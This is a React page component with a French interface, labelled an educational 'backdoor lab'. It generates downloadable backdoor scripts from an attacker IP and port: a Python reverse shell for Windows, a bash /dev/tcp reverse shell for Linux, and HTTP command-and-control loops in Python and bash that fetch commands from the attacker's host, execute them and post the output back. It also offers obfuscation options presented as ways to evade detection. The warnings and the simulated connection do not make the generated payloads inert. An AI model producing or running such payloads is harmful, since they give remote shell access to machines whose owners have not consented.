import React, { useState } from 'react';
import { FiKey, FiPlay, FiInfo, FiAlertCircle, FiDownload, FiServer, FiMonitor } from 'react-icons/fi';
import { FcBiohazard } from 'react-icons/fc';

const Backdoor = () => {
  const [backdoorType, setBackdoorType] = useState('reverse_shell');
  const [targetIp, setTargetIp] = useState('');
  const [port, setPort] = useState('4444');
  const [platform, setPlatform] = useState('windows');
  const [encryption, setEncryption] = useState('none');
  const [isGenerating, setIsGenerating] = useState(false);
  const [generatedCode, setGeneratedCode] = useState('');
  const [error, setError] = useState(null);
  const [successMessage, setSuccessMessage] = useState(null);
  const [connectionStatus, setConnectionStatus] = useState('disconnected'); // disconnected, connecting, connected

  const generateBackdoor = () => {
    if (!targetIp) {
      setError('Veuillez spécifier une adresse IP cible');
      return;
    }

    if (!port || isNaN(parseInt(port))) {
      setError('Veuillez spécifier un port valide');
      return;
    }

    setIsGenerating(true);
    setError(null);
    setSuccessMessage(null);
    setGeneratedCode('');

    // Simuler la génération du backdoor
    setTimeout(() => {
      let code = '';
      
      if (platform === 'windows') {
        if (backdoorType === 'reverse_shell') {
          code = `# Reverse Shell Python pour Windows\nimport socket,subprocess,os\n\nHOST = "${targetIp}"\nPORT = ${port}\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((HOST, PORT))\n\nwhile True:\n    data = s.recv(1024)\n    if data == "exit":\n        break\n    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n    stdout_value = proc.stdout.read() + proc.stderr.read()\n    s.send(stdout_value)\n\ns.close()`;
        } else {
          code = `# Backdoor HTTP pour Windows\nimport requests\nimport subprocess\nimport time\n\nC2_SERVER = "http://${targetIp}:${port}/commands"\n\nwhile True:\n    try:\n        cmd = requests.get(C2_SERVER).text\n        if cmd:\n            output = subprocess.getoutput(cmd)\n            requests.post(C2_SERVER + "/result", data=output)\n    except:\n        pass\n    time.sleep(5)`;
        }
      } else {
        if (backdoorType === 'reverse_shell') {
          code = `#!/bin/bash\n# Reverse Shell Bash pour Linux\nbash -i >& /dev/tcp/${targetIp}/${port} 0>&1`;
        } else {
          code = `#!/bin/bash\n# Backdoor HTTP pour Linux\nwhile true; do\n  cmd=$(curl -s http://${targetIp}:${port}/commands)\n  if [ ! -z "$cmd" ]; then\n    output=$(eval "$cmd")\n    curl -s -X POST -d "$output" http://${targetIp}:${port}/result\n  fi\n  sleep 5\ndone`;
        }
      }
      
      if (encryption === 'base64') {
        code = `# Code encodé en Base64 pour éviter la détection\n# Décodez et exécutez avec:\n# ${platform === 'windows' ? 'python -c "import base64; exec(base64.b64decode(\'BASE64_ENCODED_PAYLOAD\'))"' : 'echo "BASE64_ENCODED_PAYLOAD" | base64 -d | bash'}\n\n# Le code encodé serait placé ici dans une implémentation réelle`;
      } else if (encryption === 'xor') {
        code = `# Code chiffré avec XOR pour éviter la détection\n# Une clé de chiffrement serait utilisée pour déchiffrer le payload\n# ${platform === 'windows' ? 'Une routine de déchiffrement en Python serait ajoutée' : 'Une routine de déchiffrement en Bash serait ajoutée'}\n\n# Le code chiffré serait placé ici dans une implémentation réelle`;
      }
      
      setGeneratedCode(code);
      setIsGenerating(false);
      setSuccessMessage('Backdoor généré avec succès!');
    }, 1500);
  };

  const simulateConnection = () => {
    if (!generatedCode) {
      setError('Veuillez d\'abord générer un backdoor');
      return;
    }
    
    setConnectionStatus('connecting');
    
    // Simuler une tentative de connexion
    setTimeout(() => {
      setConnectionStatus('connected');
      setSuccessMessage('Connexion établie! Cette simulation ne crée pas de véritable backdoor.');
    }, 2000);
  };

  const downloadCode = () => {
    if (!generatedCode) {
      setError('Aucun code à télécharger');
      return;
    }
    
    const extension = platform === 'windows' ? '.py' : '.sh';
    const filename = `backdoor_${backdoorType}${extension}`;
    const blob = new Blob([generatedCode], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    setSuccessMessage('Code téléchargé avec succès');
  };

  return (
    <div className="container mx-auto p-4">
      <h1 className="text-2xl font-bold mb-6 flex items-center text-gray-800 dark:text-white">
        <FcBiohazard className="mr-2" size={24} />
        Laboratoire de Backdoor
      </h1>

      {/* Description et avertissement */}
      <div className="bg-red-50 dark:bg-red-900/30 p-4 rounded-md mb-6 border-l-4 border-red-500">
        <div className="flex items-start">
          <FiAlertCircle className="mr-2 mt-1 text-red-500" size={20} />
          <div>
            <p className="text-red-800 dark:text-red-200 font-bold">AVERTISSEMENT: Laboratoire éducatif uniquement</p>
            <p className="text-red-700 dark:text-red-300 mt-1">
              Ce laboratoire est conçu uniquement à des fins éducatives, pour comprendre les mécanismes de sécurité
              et les techniques de protection contre les logiciels malveillants.
            </p>
            <p className="text-red-700 dark:text-red-300 mt-2 font-semibold">
              N'utilisez JAMAIS ces techniques sur des systèmes sans autorisation explicite.
              L'utilisation inappropriée est illégale et contraire à l'éthique.
            </p>
          </div>
        </div>
      </div>

      {/* Affichage des erreurs */}
      {error && (
        <div className="bg-red-100 dark:bg-red-900 border-l-4 border-red-500 text-red-700 dark:text-red-200 p-4 mb-6 rounded">
          <div className="flex items-center">
            <FiAlertCircle className="mr-2" size={20} />
            <p>{error}</p>
          </div>
          <button 
            onClick={() => setError(null)} 
            className="text-sm underline mt-2"
          >
            Fermer
          </button>
        </div>
      )}

      {/* Message de succès */}
      {successMessage && (
        <div className="bg-green-100 dark:bg-green-900 border-l-4 border-green-500 text-green-700 dark:text-green-200 p-4 mb-6 rounded">
          <p>{successMessage}</p>
          <button 
            onClick={() => setSuccessMessage(null)} 
            className="text-sm underline mt-2"
          >
            Fermer
          </button>
        </div>
      )}

      {/* Formulaire de configuration */}
      <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md mb-6">
        <h2 className="text-xl font-semibold mb-4 text-gray-800 dark:text-white">Configuration du backdoor</h2>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
          <div>
            <label className="block text-gray-700 dark:text-gray-300 font-medium mb-2">
              Type de backdoor
            </label>
            <select
              value={backdoorType}
              onChange={(e) => setBackdoorType(e.target.value)}
              disabled={isGenerating}
              className="w-full p-2 border rounded-md bg-gray-50 dark:bg-gray-700 dark:border-gray-600 dark:text-white"
            >
              <option value="reverse_shell">Reverse Shell</option>
              <option value="http_backdoor">HTTP Backdoor</option>
            </select>
          </div>
          
          <div>
            <label className="block text-gray-700 dark:text-gray-300 font-medium mb-2">
              Plateforme cible
            </label>
            <select
              value={platform}
              onChange={(e) => setPlatform(e.target.value)}
              disabled={isGenerating}
              className="w-full p-2 border rounded-md bg-gray-50 dark:bg-gray-700 dark:border-gray-600 dark:text-white"
            >
              <option value="windows">Windows</option>
              <option value="linux">Linux</option>
            </select>
          </div>
          
          <div>
            <label className="block text-gray-700 dark:text-gray-300 font-medium mb-2">
              Adresse IP de l'attaquant
            </label>
            <input
              type="text"
              value={targetIp}
              onChange={(e) => setTargetIp(e.target.value)}
              disabled={isGenerating}
              placeholder="192.168.1.100"
              className="w-full p-2 border rounded-md bg-gray-50 dark:bg-gray-700 dark:border-gray-600 dark:text-white"
            />
          </div>
          
          <div>
            <label className="block text-gray-700 dark:text-gray-300 font-medium mb-2">
              Port d'écoute
            </label>
            <input
              type="text"
              value={port}
              onChange={(e) => setPort(e.target.value)}
              disabled={isGenerating}
              placeholder="4444"
              className="w-full p-2 border rounded-md bg-gray-50 dark:bg-gray-700 dark:border-gray-600 dark:text-white"
            />
          </div>
          
          <div className="md:col-span-2">
            <label className="block text-gray-700 dark:text-gray-300 font-medium mb-2">
              Technique d'obfuscation
            </label>
            <select
              value={encryption}
              onChange={(e) => setEncryption(e.target.value)}
              disabled={isGenerating}
              className="w-full p-2 border rounded-md bg-gray-50 dark:bg-gray-700 dark:border-gray-600 dark:text-white"
            >
              <option value="none">Aucune (texte clair)</option>
              <option value="base64">Encodage Base64</option>
              <option value="xor">Chiffrement XOR</option>
            </select>
          </div>
        </div>
        
        <div className="flex justify-end">
          <button
            onClick={generateBackdoor}
            disabled={isGenerating}
            className={`flex items-center px-4 py-2 rounded-md font-medium ${
              isGenerating
                ? 'bg-gray-400 cursor-not-allowed text-white'
                : 'bg-blue-600 hover:bg-blue-700 text-white'
            }`}
          >
            <FiPlay className="mr-2" />
            {isGenerating ? 'Génération en cours...' : 'Générer le code'}
          </button>
        </div>
      </div>
      
      {/* Code généré */}
      {generatedCode && (
        <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md mb-6">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-xl font-semibold text-gray-800 dark:text-white">Code généré</h2>
            <div className="flex space-x-2">
              <button
                onClick={downloadCode}
                className="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-md flex items-center"
              >
                <FiDownload className="mr-2" />
                Télécharger
              </button>
            </div>
          </div>
          
          <div className="bg-gray-900 text-gray-100 p-4 rounded-md font-mono text-sm overflow-x-auto">
            <pre>{generatedCode}</pre>
          </div>
        </div>
      )}
      
      {/* Simulateur de connexion */}
      {generatedCode && (
        <div className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-md">
          <h2 className="text-xl font-semibold mb-4 text-gray-800 dark:text-white">Simulateur de connexion</h2>
          
          <div className="flex items-center mb-4 space-x-4">
            <div className={`flex items-center ${
              connectionStatus === 'disconnected' ? 'text-gray-500 dark:text-gray-400' :
              connectionStatus === 'connecting' ? 'text-yellow-500 dark:text-yellow-400' :
              'text-green-500 dark:text-green-400'
            }`}>
              <FiServer className="mr-2" size={20} />
              <span>Serveur</span>
            </div>
            
            <div className="flex-1 h-1 bg-gray-200 dark:bg-gray-700 relative">
              <div className={`absolute top-0 left-0 h-full ${
                connectionStatus === 'disconnected' ? 'w-0 bg-gray-400' :
                connectionStatus === 'connecting' ? 'w-1/2 bg-yellow-400 animate-pulse' :
                'w-full bg-green-500'
              } transition-all duration-500`}></div>
            </div>
            
            <div className={`flex items-center ${
              connectionStatus === 'disconnected' ? 'text-gray-500 dark:text-gray-400' :
              connectionStatus === 'connecting' ? 'text-yellow-500 dark:text-yellow-400' :
              'text-green-500 dark:text-green-400'
            }`}>
              <FiMonitor className="mr-2" size={20} />
              <span>Client</span>
            </div>
          </div>
          
          <div className="flex justify-center mt-6">
            <button
              onClick={simulateConnection}
              disabled={connectionStatus !== 'disconnected'}
              className={`flex items-center px-6 py-3 rounded-md font-medium ${
                connectionStatus !== 'disconnected'
                  ? 'bg-gray-400 cursor-not-allowed text-white'
                  : 'bg-red-600 hover:bg-red-700 text-white'
              }`}
            >
              <FiKey className="mr-2" />
              {connectionStatus === 'disconnected' ? 'Simuler la connexion' : 
               connectionStatus === 'connecting' ? 'Connexion en cours...' : 
               'Connecté'}
            </button>
          </div>
          
          <div className="mt-4 text-center text-sm text-gray-500 dark:text-gray-400">
            <p>Cette simulation ne crée pas de véritable connexion ou de backdoor, elle est purement éducative.</p>
          </div>
        </div>
      )}
    </div>
  );
};

export default Backdoor; 